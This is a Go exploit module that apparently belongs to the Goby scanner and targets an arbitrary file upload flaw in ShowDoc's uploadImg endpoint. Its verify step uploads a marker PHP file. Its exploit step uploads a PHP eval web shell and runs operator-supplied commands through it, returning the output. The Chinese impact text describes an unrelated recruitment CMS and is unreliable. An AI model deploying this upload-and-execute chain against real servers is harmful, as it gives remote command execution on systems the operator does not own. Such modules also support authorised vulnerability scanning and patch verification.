package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ShowDoc uploadImg Arbitrary file upload",
    "Description": "Showdoc is a great online document sharing tool for IT teams that can speed up communication between teams. With SHOWDOC, you can easily write beautiful API documentation, data dictionary documentation, technical documentation, online excel documentation, and more using Markdown syntax.",
    "Impact": "ShowDoc uploadImg Arbitrary file upload",
    "Recommendation": "<p>1. Contact the manufacturer for repair: https://www.showdoc.cc/</p>2. Set access policies and whitelist access through security devices such as firewalls. <p>3. If not necessary, prohibit the public network from accessing the system. </p>",
    "Product": "ShowDoc",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "ShowDoc uploadImg 任意文件上传漏洞",
            "Description": "ShowDoc是一个非常适合IT团队的在线API文档、技术文档工具。你可以使用Showdoc来编写在线API文档、技术文档、数据字典、在线手册.",
            "Impact": "<p>骑士CMS人才招聘系统是基于PHP+MYSQL的免费网站管理系统源码，提供完善的人才招聘网站建设方案。强大的猎头,校园招聘系统。<br></p><p>该系统存在模板注入漏洞，攻击者可通过该漏洞执行恶意命令，从而获取服务器的权限。</p>",
            "Recommendation": "<p style=\"text-align: start;\"><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">1、联系厂商进行修复：<a href=\"https://www.showdoc.cc/\" rel=\"nofollow\">https://www.showdoc.cc/</a></span><br></p><p style=\"text-align: start;\">2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p style=\"text-align: start;\">3、如非必要，禁止公网访问该系统。</p>",
            "Product": "ShowDoc",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "ShowDoc uploadImg Arbitrary file upload",
            "Description": "Showdoc is a great online document sharing tool for IT teams that can speed up communication between teams. With SHOWDOC, you can easily write beautiful API documentation, data dictionary documentation, technical documentation, online excel documentation, and more using Markdown syntax.",
            "Impact": "ShowDoc uploadImg Arbitrary file upload",
            "Recommendation": "<p style=\"text-align: start;\"><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">1. Contact the manufacturer for repair: <a href=\"https://www.showdoc.cc/\" rel=\"nofollow\">https://www.showdoc.cc/</a></span><br></p>< p style=\"text-align: start;\">2. Set access policies and whitelist access through security devices such as firewalls. </p><p style=\"text-align: start;\">3. If not necessary, prohibit the public network from accessing the system. </p>",
            "Product": "ShowDoc",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "title=\"ShowDoc\"",
    "GobyQuery": "title=\"ShowDoc\"",
    "Author": "go0p",
    "Homepage": "https://www.showdoc.com.cn/",
    "DisclosureDate": "2021-04-19",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.3",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "echo+md5(1);",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "ShowDoc"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10187"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/index.php?s=/home/page/uploadImg")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------------------------921378126371623762173617")
			cfg.Data = "----------------------------921378126371623762173617\r\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"testing.<>php\"\r\nContent-Type: text/plain\r\n\r\n<?php echo md5('fjashfk');unlink(__FILE__);?>\r\n----------------------------921378126371623762173617--"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "success") {
				reg := regexp.MustCompile(`(?P<date>\d{4}-\d{2}-\d{2})\\/(?P<file>[a-f0-9]+\.php)`)
				filePath := reg.FindStringSubmatch(resp.RawBody)
				if len(filePath) != 0 {
					if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/Public/Uploads/" + filePath[1] + "/" + filePath[2]); err == nil && strings.Contains(resp.RawBody, "82a3c654fd25f018d72022dd8a319a72") {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/index.php?s=/home/page/uploadImg")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------------------------921378126371623762173617")
			cfg.Data = "----------------------------921378126371623762173617\r\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"testing.<>php\"\r\nContent-Type: text/plain\r\n\r\n<?php @eval($_GET[cmd]);unlink(__FILE__);?>\r\n----------------------------921378126371623762173617--"
			cmd := ss.Params["cmd"].(string)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "success") {
				reg := regexp.MustCompile(`(?P<date>\d{4}-\d{2}-\d{2})\\/(?P<file>[a-f0-9]+\.php)`)
				filePath := reg.FindStringSubmatch(resp.RawBody)
				if len(filePath) != 0 {
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/Public/Uploads/" + filePath[1] + "/" + filePath[2] + "?cmd=" + cmd); err == nil && resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = resp.Utf8Html
					}
				}
			}
			return expResult
		},
	))
}
